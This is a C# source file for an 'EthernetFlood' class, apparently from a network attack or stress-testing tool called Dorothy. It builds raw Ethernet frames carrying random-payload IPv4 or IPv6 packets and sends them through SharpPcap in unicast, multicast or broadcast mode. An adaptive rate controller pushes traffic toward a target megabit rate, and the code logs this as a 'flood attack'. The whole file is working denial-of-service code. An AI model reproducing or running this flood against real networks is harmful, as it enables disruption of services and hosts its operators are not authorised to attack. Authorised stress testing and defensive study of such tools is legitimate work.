using System;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Threading;
using System.Threading.Tasks;
using PacketDotNet;
using SharpPcap;
using SharpPcap.LibPcap;
using NLog;
using System.Diagnostics;

namespace Dorothy.Models
{
    public class EthernetFlood : IDisposable
    {
        private readonly PacketParameters _parameters;
        private readonly CancellationToken _cancellationToken;
        private readonly EthernetPacketType _packetType;
        private readonly bool _useIPv6;
        private LibPcapLiveDevice? _device;
        private static readonly ILogger Logger = LogManager.GetCurrentClassLogger();
        private const int PacketSize = 1400; // Standard size for good throughput
        private const int MICRO_BATCH_SIZE = 10; // Send packets in small batches for better rate control
        public event EventHandler<PacketEventArgs>? PacketSent;

        public enum EthernetPacketType
        {
            Unicast,
            Multicast,
            Broadcast
        }

        public EthernetFlood(PacketParameters parameters, EthernetPacketType packetType, CancellationToken cancellationToken, bool useIPv6 = false)
        {
            _parameters = parameters;
            _packetType = packetType;
            _cancellationToken = cancellationToken;
            _useIPv6 = useIPv6 || parameters.SourceIp.AddressFamily == System.Net.Sockets.AddressFamily.InterNetworkV6;
        }

        protected virtual void OnPacketSent(byte[] packet, IPAddress sourceIp, IPAddress destinationIp, int port)
        {
            PacketSent?.Invoke(this, new PacketEventArgs(packet, sourceIp, destinationIp, port));
        }

        public async Task StartAsync()
        {
            try
            {
                var allDevices = CaptureDeviceList.Instance;
                _device = allDevices.OfType<LibPcapLiveDevice>()
                    .FirstOrDefault(d => d.Interface.Addresses
                        .Any(a => a.Addr?.ipAddress?.ToString() == _parameters.SourceIp.ToString()));

                if (_device == null)
                {
                    throw new Exception("No suitable network interface found");
                }

                _device.Open();
                Logger.Info($"Started Ethernet {_packetType} flood attack ({(_useIPv6 ? "IPv6" : "IPv4")})");

                // Create a sample packet to get actual size
                var samplePacket = CreatePacket();
                int totalPacketSize = samplePacket.Bytes.Length;
                
                // Calculate base rate: Mbps -> bytes per second (accounting for actual packet size)
                long targetBytesPerSecond = _parameters.BytesPerSecond;
                double basePacketsPerSecond = (double)targetBytesPerSecond / totalPacketSize;

                // Pre-generate packet pool for better performance
                var packetPool = new Packet[MICRO_BATCH_SIZE];
                for (int i = 0; i < MICRO_BATCH_SIZE; i++)
                {
                    packetPool[i] = CreatePacket();
                }

                await Task.Run(() =>
                {
                    var stopwatch = Stopwatch.StartNew();
                    int poolIndex = 0;
                    int packetsSent = 0;
                    
                    // Dynamic rate control: measure actual rate and adjust smoothly
                    var rateMeasurementStartTime = DateTime.UtcNow;
                    double rateMultiplier = 1.8; // Start with higher multiplier for faster ramp-up
                    const int measurementInterval = 250; // Measure rate more frequently for faster response
                    double targetMbps = _parameters.BytesPerSecond * 8.0 / 1_000_000;
                    double actualMbps = 0;
                    bool isBehindTarget = true; // Start by sending aggressively
                    double lastActualMbps = 0;
                    int stableMeasurements = 0;
                    
                    while (!_cancellationToken.IsCancellationRequested)
                    {
                        try
                        {
                            // Send packet immediately - no waiting when trying to achieve target rate
                            
                                // Regenerate packet periodically for randomization
                                if (poolIndex % 100 == 0)
                                {
                                packetPool[poolIndex] = CreatePacket();
                                }
                                
                            // Send single packet
                            var packet = packetPool[poolIndex];
                            _device.SendPacket(packet);
                            var packetBytes = packet.Bytes;
                            OnPacketSent(packetBytes, _parameters.SourceIp, _parameters.DestinationIp, _parameters.DestinationPort);
                                packetsSent++;
                            poolIndex = (poolIndex + 1) % MICRO_BATCH_SIZE;

                            // Measure actual rate and adjust multiplier frequently
                            if (packetsSent % measurementInterval == 0)
                            {
                                var elapsedSeconds = (DateTime.UtcNow - rateMeasurementStartTime).TotalSeconds;

                                if (elapsedSeconds > 0.05) // Need at least 50ms of data
                                {
                                    // Calculate actual packets per second
                                    double actualPacketsPerSecond = measurementInterval / elapsedSeconds;
                                    actualMbps = (actualPacketsPerSecond * totalPacketSize * 8.0) / 1_000_000;

                                    // Detect oscillation
                                    bool isOscillating = false;
                                    if (lastActualMbps > 0 && Math.Abs(actualMbps - lastActualMbps) / lastActualMbps > 0.10) // More than 10% change
                                    {
                                        isOscillating = true;
                                        stableMeasurements = 0;
                                    }
                                    else
                                    {
                                        isOscillating = false;
                                        stableMeasurements++;
                                    }
                                    lastActualMbps = actualMbps;

                                    // Calculate what multiplier we need to achieve target
                                    if (actualMbps > 0 && targetMbps > 0)
                                    {
                                        // If we're achieving X% of target, we need (target/actual) multiplier
                                        double newMultiplier = targetMbps / actualMbps;

                                        // Adjust smoothing based on oscillation and position relative to target
                                        if (isOscillating)
                                        {
                                            rateMultiplier = (rateMultiplier * 0.85) + (newMultiplier * 0.15); // Heavy smoothing
                                        }
                                        else if (isBehindTarget)
                                        {
                                            // When behind target, allow faster adjustment to ramp up quickly
                                            // For high rates, use more aggressive 40/60 split; for low rates, use 50/50
                                            double smoothingFactor = targetMbps > 32 ? 0.4 : 0.5; // More aggressive for high rates
                                            rateMultiplier = (rateMultiplier * smoothingFactor) + (newMultiplier * (1.0 - smoothingFactor));
                                            stableMeasurements++;
                                        }
                                        else
                                        {
                                            // When at or above target, use moderate smoothing for stability
                                            rateMultiplier = (rateMultiplier * 0.75) + (newMultiplier * 0.25);
                                            stableMeasurements++;
                                        }

                                        // Clamp multiplier to reasonable range based on target rate
                                        // Increased max based on target rate: 8.0x for very high rates (>100), 6.0x for high (>64), 5.0x for medium (>32), 3.0x for low (>10), 1.5x for very low
                                        double maxMultiplierClamp = targetMbps > 100 ? 8.0 : (targetMbps > 64 ? 6.0 : (targetMbps > 32 ? 5.0 : (targetMbps > 10 ? 3.0 : 1.5)));
                                        rateMultiplier = Math.Max(0.8, Math.Min(maxMultiplierClamp, rateMultiplier));

                                        // Check if we're behind target - use wider tolerance for stability
                                        isBehindTarget = actualMbps < targetMbps * 0.95; // 5% tolerance

                                        Logger.Info($"Ethernet {_packetType} ({(_useIPv6 ? "IPv6" : "IPv4")}) rate feedback: actual={actualMbps:F2} Mbps, target={targetMbps:F2} Mbps, multiplier={rateMultiplier:F3}, behind={isBehindTarget}, oscillating={isOscillating}");
                                    }

                                    // Reset measurement
                                    rateMeasurementStartTime = DateTime.UtcNow;
                                }
                            }

                            // Always apply delay based on target rate, but adjust multiplier based on feedback
                            // This ensures we respect low Mbps settings (like 1 Mbps) from the start
                            // But also allows reaching high Mbps (like 100 Mbps) by using aggressive multipliers
                            double adjustedPacketsPerSecond = basePacketsPerSecond;
                            
                            // If we have measurements and are significantly ahead, use target rate directly
                            // Otherwise, apply multiplier to compensate for overhead
                            if (actualMbps > 0 && actualMbps > targetMbps * 1.05 && stableMeasurements >= 2)
                            {
                                // We're ahead and stable - use target rate directly to maintain exact target
                                adjustedPacketsPerSecond = basePacketsPerSecond;
                            }
                            else if (packetsSent >= measurementInterval && rateMultiplier > 0)
                                {
                                // Apply multiplier to compensate for overhead
                                // For very high rates, allow up to 8.0x multiplier; for high rates 6.0x; for low rates, cap lower to respect target
                                double maxMultiplier = targetMbps > 100 ? 8.0 : (targetMbps > 64 ? 6.0 : (targetMbps > 32 ? 5.0 : (targetMbps > 10 ? 3.0 : 1.5))); // More aggressive for high rates
                                adjustedPacketsPerSecond = basePacketsPerSecond * Math.Min(rateMultiplier, maxMultiplier);
                            }
                            else
                            {
                                // Initial phase - use multiplier based on target rate
                                // Low rates: use 1.0x (no overshoot), Medium: 1.8x, High rates: 3.5x, Very high: 4.0x for faster ramp-up
                                double initialMultiplier = targetMbps > 100 ? 4.0 : (targetMbps > 64 ? 3.5 : (targetMbps > 32 ? 2.5 : (targetMbps > 10 ? 1.8 : 1.0)));
                                adjustedPacketsPerSecond = basePacketsPerSecond * initialMultiplier;
                                }
                                
                            // Always apply delay based on adjusted rate to respect target Mbps
                            double microsecondsPerPacket = 1_000_000.0 / adjustedPacketsPerSecond;
                            long ticksPerPacket = (long)(microsecondsPerPacket * Stopwatch.Frequency / 1_000_000.0);
                            
                            if (ticksPerPacket > 0)
                            {
                                long currentTicks = stopwatch.ElapsedTicks;
                                long nextPacketTime = currentTicks + ticksPerPacket;
                                
                                // Wait until it's time to send the next packet
                                if (nextPacketTime > currentTicks)
                                {
                                    while (stopwatch.ElapsedTicks < nextPacketTime)
                                {
                                    if (_cancellationToken.IsCancellationRequested) return;
                                        Thread.SpinWait(1);
                                }
                            }
                            }
                        }
                        catch (Exception ex)
                        {
                            Logger.Error($"Error sending packet: {ex.Message}");
                            throw;
                        }
                    }
                }, _cancellationToken);
            }
            catch (Exception ex)
            {
                Logger.Error($"Ethernet flood attack failed: {ex.Message}");
                throw;
            }
        }

        private Packet CreatePacket()
        {
            var ethernetPacket = CreateEthernetPacket();
            Packet ipPacket;
            
            if (_useIPv6)
            {
                ipPacket = CreateIPv6Packet();
            }
            else
            {
                ipPacket = CreateIPv4Packet();
            }
            
            ethernetPacket.PayloadPacket = ipPacket;
            return ethernetPacket;
        }

        private EthernetPacket CreateEthernetPacket()
        {
            PhysicalAddress destMac = _packetType switch
            {
                EthernetPacketType.Unicast => new PhysicalAddress(_parameters.DestinationMac),
                EthernetPacketType.Multicast => _useIPv6 
                    ? PhysicalAddress.Parse("33-33-00-00-00-01") // IPv6 multicast
                    : PhysicalAddress.Parse("01-00-5E-00-00-01"), // IPv4 multicast
                EthernetPacketType.Broadcast => PhysicalAddress.Parse("FF-FF-FF-FF-FF-FF"),
                _ => throw new ArgumentException("Invalid Ethernet packet type")
            };

            var etherType = _useIPv6 ? EthernetType.IPv6 : EthernetType.IPv4;

            return new EthernetPacket(
                new PhysicalAddress(_parameters.SourceMac),
                destMac,
                etherType);
        }

        private IPv4Packet CreateIPv4Packet()
        {
            var payload = new byte[PacketSize];
            Random.Shared.NextBytes(payload);

            return new IPv4Packet(_parameters.SourceIp, _parameters.DestinationIp)
            {
                Protocol = ProtocolType.Raw,
                PayloadData = payload,
                TimeToLive = _parameters.Ttl
            };
        }

        private IPv6Packet CreateIPv6Packet()
        {
            var payload = new byte[PacketSize];
            Random.Shared.NextBytes(payload);

            return new IPv6Packet(_parameters.SourceIp, _parameters.DestinationIp)
            {
                PayloadData = payload,
                HopLimit = _parameters.Ttl
            };
        }

        public void Dispose()
        {
            if (_device != null)
            {
                if (_device.Opened)
                {
                    _device.Close();
                }
                _device.Dispose();
                Logger.Info("Ethernet flood device closed and disposed");
            }
        }
    }
} 